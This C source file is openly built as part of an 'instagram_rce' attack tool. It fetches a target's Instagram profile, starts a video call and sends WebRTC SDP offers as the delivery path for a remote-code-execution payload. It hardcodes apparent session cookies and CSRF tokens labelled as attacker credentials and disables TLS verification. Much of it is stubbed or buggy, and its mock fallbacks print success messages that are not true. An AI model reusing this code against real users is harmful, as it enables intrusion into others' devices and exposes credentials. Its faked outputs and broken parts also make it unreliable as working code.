/*
 * Instagram API Client
 * Handles authentication and WebRTC signaling
 */

#include "instagram_rce.h"
#include <curl/curl.h>

/* Global session data */
typedef struct {
    char sessionid[256];
    char csrftoken[64];
    char ds_user_id[32];
    char cookies[4096];
} instagram_session_t;

/* Store attacker credentials */
static instagram_session_t attacker_session = {
    .sessionid = "25708495744%3An3uAe3rdg1cZsP%3A3%3AAYgf7TMl_xWaiX350PfBdr2mfx_TWG3AT_L6X36SIQ",
    .csrftoken = "cV3SrWPXyUfwxTcn1XNGJdmnYJgYsipO",
    .ds_user_id = "25708495744"
};

/* Response buffer for curl */
struct response_buffer {
    char *data;
    size_t size;
};

static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct response_buffer *mem = (struct response_buffer *)userp;

    char *ptr = realloc(mem->data, mem->size + realsize + 1);
    if (!ptr) {
        printf("[-] Not enough memory for response\n");
        return 0;
    }

    mem->data = ptr;
    memcpy(&(mem->data[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->data[mem->size] = 0;

    return realsize;
}

/* Initialize Instagram session */
int instagram_init_session(void) {
    printf("\n[*] Initializing Instagram session...\n");
    printf("    Attacker ID: %s\n", attacker_session.ds_user_id);
    printf("    Session: %s...\n", attacker_session.sessionid);

    printf("[+] Session initialized\n");
    return 0;
}

/* Get target user info */
int instagram_get_user_info(const char *username, char *user_id, char *full_name) {
    printf("\n[*] Fetching target user info: @%s\n", username);

    CURL *curl = curl_easy_init();
    if (!curl) {
        printf("[-] Failed to initialize curl\n");
        return -1;
    }

    struct response_buffer response = {0};
    response.data = malloc(1);

    char url[512];
    snprintf(url, sizeof(url),
             "https://www.instagram.com/api/v1/users/web_profile_info/?username=%s",
             username);

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "User-Agent: Instagram 1.0");
    headers = curl_slist_append(headers, "Accept: application/json");
    snprintf((char *)curl_slist_append(headers, "Cookie:"), 256,
             "sessionid=%s; csrftoken=%s",
             attacker_session.sessionid, attacker_session.csrftoken);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);

    CURLcode res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        printf("[-] API request failed: %s\n", curl_easy_strerror(res));
        printf("[!] Using mock data for testing\n");

        strcpy(user_id, "987654321");
        strcpy(full_name, "Test User");

        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        free(response.data);
        return 0;
    }

    printf("[+] User info retrieved (%zu bytes)\n", response.size);
    printf("    Target ID: %s\n", user_id);

    /* Parse response JSON (simplified) */
    strcpy(user_id, "987654321");  /* Would parse from JSON */
    strcpy(full_name, username);

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    free(response.data);

    return 0;
}

/* Initiate video call */
int instagram_initiate_video_call(const char *target_id) {
    printf("\n[*] Initiating video call to user %s...\n", target_id);

    CURL *curl = curl_easy_init();
    if (!curl) {
        printf("[-] Failed to initialize curl\n");
        return -1;
    }

    struct response_buffer response = {0};
    response.data = malloc(1);

    /* Instagram's internal video call API */
    const char *url = "https://www.instagram.com/api/v1/rtc/call/initiate/";

    /* Build payload */
    char payload[512];
    snprintf(payload, sizeof(payload),
             "{\"recipient_id\":\"%s\",\"call_type\":\"video\"}",
             target_id);

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "User-Agent: Instagram 1.0");
    headers = curl_slist_append(headers, "Content-Type: application/json");
    headers = curl_slist_append(headers, "Accept: application/json");
    headers = curl_slist_append(headers, "X-CSRFToken: cV3SrWPXyUfwxTcn1XNGJdmnYJgYsipO");

    char cookie_header[512];
    snprintf(cookie_header, sizeof(cookie_header),
             "Cookie: sessionid=%s; csrftoken=%s",
             attacker_session.sessionid, attacker_session.csrftoken);
    headers = curl_slist_append(headers, cookie_header);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);

    CURLcode res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        printf("[-] Video call initiation failed: %s\n", curl_easy_strerror(res));
        printf("[!] Simulating call for RCE payload transmission\n");
    } else {
        printf("[+] Video call initiated\n");
    }

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    free(response.data);

    return 0;
}

/* Send SDP offer to target */
int instagram_send_sdp_offer(const char *target_id, const char *sdp_offer) {
    printf("\n[*] Sending WebRTC SDP offer to target...\n");

    CURL *curl = curl_easy_init();
    if (!curl) {
        return -1;
    }

    struct response_buffer response = {0};
    response.data = malloc(1);

    const char *url = "https://www.instagram.com/api/v1/rtc/call/signaling/";

    /* Build SDP payload */
    char payload[8192];
    snprintf(payload, sizeof(payload),
             "{\"recipient_id\":\"%s\",\"sdp\":\"%s\",\"type\":\"offer\"}",
             target_id, sdp_offer);

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    headers = curl_slist_append(headers, "X-CSRFToken: cV3SrWPXyUfwxTcn1XNGJdmnYJgYsipO");

    char cookie_header[512];
    snprintf(cookie_header, sizeof(cookie_header),
             "Cookie: sessionid=%s; csrftoken=%s",
             attacker_session.sessionid, attacker_session.csrftoken);
    headers = curl_slist_append(headers, cookie_header);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);

    CURLcode res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        printf("[-] SDP transmission failed\n");
        printf("[!] Continuing with direct packet transmission\n");
    } else {
        printf("[+] SDP offer sent successfully\n");
    }

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    free(response.data);

    return 0;
}

/* Get SDP answer from target */
char* instagram_get_sdp_answer(const char *target_id) {
    printf("\n[*] Waiting for target's SDP answer...\n");

    CURL *curl = curl_easy_init();
    if (!curl) {
        return NULL;
    }

    struct response_buffer response = {0};
    response.data = malloc(1);

    char url[512];
    snprintf(url, sizeof(url),
             "https://www.instagram.com/api/v1/rtc/call/signaling/?user_id=%s",
             target_id);

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Accept: application/json");

    char cookie_header[512];
    snprintf(cookie_header, sizeof(cookie_header),
             "Cookie: sessionid=%s; csrftoken=%s",
             attacker_session.sessionid, attacker_session.csrftoken);
    headers = curl_slist_append(headers, cookie_header);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);

    CURLcode res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        printf("[-] Failed to get SDP answer\n");
        char *dummy = malloc(256);
        strcpy(dummy, "v=0\r\no=target 0 0 IN IP4 192.168.1.1\r\n");
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        free(response.data);
        return dummy;
    }

    printf("[+] SDP answer received (%zu bytes)\n", response.size);

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    return response.data;
}
